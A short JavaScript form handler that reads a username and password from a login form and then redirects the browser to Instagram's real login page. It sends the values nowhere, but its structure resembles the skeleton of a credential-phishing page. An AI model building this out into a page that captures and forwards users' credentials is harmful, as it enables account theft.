// Function to handle form submission
function handleFormSubmit(event) {
  event.preventDefault(); // Prevent form submission from refreshing the page
  
  // Get the input values
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;
  
  // Perform validation or other necessary checks here...
  
  // Redirect to Instagram login page
  window.location.href = 'https://www.instagram.com/accounts/login/';
}

// Attach form submit event listener
document.getElementById('loginForm').addEventListener('submit', handleFormSubmit);
